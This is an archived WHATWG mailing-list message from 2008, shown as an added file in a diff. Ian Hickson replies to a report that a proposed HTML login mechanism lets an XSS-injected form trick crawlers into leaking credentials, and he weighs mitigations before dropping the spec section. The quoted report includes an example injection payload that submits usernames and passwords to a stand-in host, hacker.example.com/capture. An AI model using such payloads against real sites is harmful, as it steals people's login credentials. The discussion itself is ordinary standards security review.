@@ -1,0 +1,148 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [whatwg] Solving the login/logout problem in HTML
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:whatwg%40lists.whatwg.org?Subject=Re%3A%20%5Bwhatwg%5D%20Solving%20the%20login/logout%20problem%20in%20HTML&In-Reply-To=%3CPine.LNX.4.62.0811262138340.17401%40hixie.dreamhostps.com%3E">
+   <META NAME="robots" CONTENT="index,nofollow">
+   <style type="text/css">
+       pre {
+           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
+           }
+   </style>
+   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
+   <LINK REL="Previous"  HREF="059791.html">
+   <LINK REL="Next"  HREF="059824.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[whatwg] Solving the login/logout problem in HTML</H1>
+<!--htdig_noindex-->
+    <B>Ian Hickson</B> 
+    <A HREF="mailto:whatwg%40lists.whatwg.org?Subject=Re%3A%20%5Bwhatwg%5D%20Solving%20the%20login/logout%20problem%20in%20HTML&In-Reply-To=%3CPine.LNX.4.62.0811262138340.17401%40hixie.dreamhostps.com%3E"
+       TITLE="[whatwg] Solving the login/logout problem in HTML">ian at hixie.ch
+       </A><BR>
+    <I>Wed Nov 26 13:41:28 PST 2008</I>
+    <P><UL>
+        <LI>Previous message: <A HREF="059791.html">[whatwg] Solving the login/logout problem in HTML
+</A></li>
+        <LI>Next message: <A HREF="059824.html">[whatwg] Solving the login/logout problem in HTML
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#59802">[ date ]</a>
+              <a href="thread.html#59802">[ thread ]</a>
+              <a href="subject.html#59802">[ subject ]</a>
+              <a href="author.html#59802">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--/htdig_noindex-->
+<!--beginarticle-->
+<PRE>On Wed, 26 Nov 2008, Philip Taylor wrote:
+&gt;<i> 
+</I>&gt;<i> If I'm not misunderstanding things, there is a new attack scenario:
+</I>&gt;<i> 
+</I>&gt;<i> I post a comment on someone's blog, saying &lt;a 
+</I>&gt;<i> href=&quot;/restricted-access.php?xsshole=&lt;form 
+</I>&gt;<i> action=<A HREF="http://hacker.example.com/capture">http://hacker.example.com/capture</A> name=login&gt;&lt;input 
+</I>&gt;<i> name=username&gt;&lt;input name=password&gt;&lt;/form&gt;&quot;&gt;crawl me!&lt;/a&gt;
+</I>&gt;<i> 
+</I>&gt;<i> On their blog's web server, restricted-access.php require 
+</I>&gt;<i> authentication, and unauthenticated access results in a 401 with 
+</I>&gt;<i> 'WWW-Authenticate: HTML form=&quot;login&quot;' and the appropriate login form. 
+</I>&gt;<i> But inevitably there's some kind of XSS hole in that page, so arbitrary 
+</I>&gt;<i> markup can be inserted above the real login form. (Maybe they pass an 
+</I>&gt;<i> error message in a parameter, which will be displayed above the form, 
+</I>&gt;<i> but they forgot to escape the output.)
+</I>&gt;<i> 
+</I>&gt;<i> Their internal search engine crawler is configured to know a username 
+</I>&gt;<i> and password (and the form field names etc) for these restricted areas. 
+</I>&gt;<i> It follows the link from my blog comment, it notices the 
+</I>&gt;<i> WWW-Authenticate header, and like a good little bot it chooses to parse 
+</I>&gt;<i> the HTML page and find the matching form and fill in the fields and 
+</I>&gt;<i> submit the login details. But actually it's submitting my XSS-inserted 
+</I>&gt;<i> form, and sending the login details to me.
+</I>&gt;<i> 
+</I>&gt;<i> XSS holes already cause various security vulnerabilities; but they can't 
+</I>&gt;<i> currently result in sensibly-written crawlers unwittingly submitting 
+</I>&gt;<i> their login details to arbitrary third parties, so this is a new risk.
+</I>
+Hm, this is indeed a problem.
+
+
+&gt;<i> I can imagine a few ways to avoid this problem:
+</I>&gt;<i> 
+</I>&gt;<i>  1) Don't write any pages with XSS holes.
+</I>&gt;<i>  2) Detect tampering by refusing to submit login details if &gt;= 2 forms
+</I>&gt;<i> match the name.
+</I>&gt;<i>  3) Only submit login details to same-origin URLs, or to some other
+</I>&gt;<i> restricted set.
+</I>&gt;<i>  4) Configure the crawler with the form submission URL, as well as the
+</I>&gt;<i> form field names and values, so it doesn't have to trust the HTML.
+</I>&gt;<i>  5) Change WWW-Authenticate so it gives all the details (submission
+</I>&gt;<i> URL, field names, etc), so nobody has to trust the HTML.
+</I>&gt;<i> 
+</I>&gt;<i> But (1) is not going to happen in reality, so we should try to minimise 
+</I>&gt;<i> the damage when XSS holes exist. (2) won't work because the attacker 
+</I>&gt;<i> could write '...?xsshole=...&lt;!--' and the second form would be hidden. 
+</I>&gt;<i> (3) is more sensible; perhaps the spec should explicitly note that you 
+</I>&gt;<i> need to be quite careful about not submitting login forms to third-party 
+</I>&gt;<i> sites unless you're sure you trust them?
+</I>
+(3) won't work anyway, since sometimes the login form is cross-domain on 
+purpose (e.g. OpenID).
+
+
+&gt;<i> But even with (3), I could write &lt;a
+</I>&gt;<i> href=&quot;/restricted-access.php?xsshole=&lt;form
+</I>&gt;<i> action=/public-pastebin.php&gt;...&quot;&gt; and the crawler would send the login
+</I>&gt;<i> details to somewhere on the same host where I could still read them
+</I>&gt;<i> back, which doesn't seem great.
+</I>&gt;<i> 
+</I>&gt;<i> So (4) is more sensible. You already have to configure the crawler
+</I>&gt;<i> with the form field names, so you might as well tell it what URL to
+</I>&gt;<i> submit to, and it shouldn't parse the HTML response or care about the
+</I>&gt;<i> &lt;form&gt; element. (Then there's no need for WWW-Authenticate to even say
+</I>&gt;<i> what the form name is.)
+</I>&gt;<i>
+</I>&gt;<i> (5) is basically the same, except it's late-binding the form details 
+</I>&gt;<i> rather than hardcoding them into the crawler's configuration, and so it 
+</I>&gt;<i> makes it easy to change the server-side login handling without 
+</I>&gt;<i> reconfiguring everyone's crawlers.
+</I>
+If we want to go with (4) or (5) then there is no need for this to be 
+bound to an HTML form anymore, and we should remove it from the spec.
+
+Is there anyone who can volunteer to edit this section as a separate spec?
+
+I guess I'll remove this section.
+
+-- 
+Ian Hickson               U+1047E                )\._.,--....,'``.    fL
+<A HREF="http://ln.hixie.ch/">http://ln.hixie.ch/</A>       U+263A                /,   _.. \   _\  ;`._ ,.
+Things that are impossible just take longer.   `._.-(,_..'--(,_..'`-.;.'
+
+</PRE>
+
+<!--endarticle-->
+<!--htdig_noindex-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI>Previous message: <A HREF="059791.html">[whatwg] Solving the login/logout problem in HTML
+</A></li>
+	<LI>Next message: <A HREF="059824.html">[whatwg] Solving the login/logout problem in HTML
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#59802">[ date ]</a>
+              <a href="thread.html#59802">[ thread ]</a>
+              <a href="subject.html#59802">[ subject ]</a>
+              <a href="author.html#59802">[ author ]</a>
+         </LI>
+       </UL>
+
+<hr>
+<a href="http://lists.whatwg.org/listinfo.cgi/whatwg-whatwg.org">More information about the whatwg
+mailing list</a><br>
+<!--/htdig_noindex-->
+</body></html>
